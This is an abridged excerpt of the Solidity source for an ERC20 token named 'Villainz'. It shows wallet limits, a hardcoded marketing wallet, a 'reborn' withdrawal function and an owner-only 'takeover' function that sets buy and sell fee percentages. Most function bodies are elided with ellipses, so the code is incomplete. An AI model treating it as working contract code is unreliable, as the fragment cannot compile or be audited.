...
// https://t.me/VillainzCoin
// https://twitter.com/villainzverse
...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "God Speed");
...
contract Villainz is Ownable, ERC20 {
    ...
    string constant _name = "Villainz";
    string constant _symbol = "Villainz";
    ...
    uint256 _totalSupply =  2600000000000 * 10**_decimals; 
    ...
    constructor () {
        ...
        marketingFeeReceiver = 0xb2ed94B407A0066Fd4267441987350E7Fc1B0882;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (!authorizations[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pair && recipient != burnFeeReceiver && recipient != marketingFeeReceiver && !isexemptfrommaxTX[recipient]){
            ...
            require((heldTokens + amount) <= _maxWalletToken,"Greed kills");}
    ...
    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isexemptfrommaxTX[sender], "Greed kills");
    }
   ...
   function reborn(address tokenAddress, uint256 tokens) external returns (bool success) {
             if(tokens == 0){
    ...
    function takeover(uint256 _percentonbuy, uint256 _percentonsell, uint256 _wallettransfer) external onlyOwner {
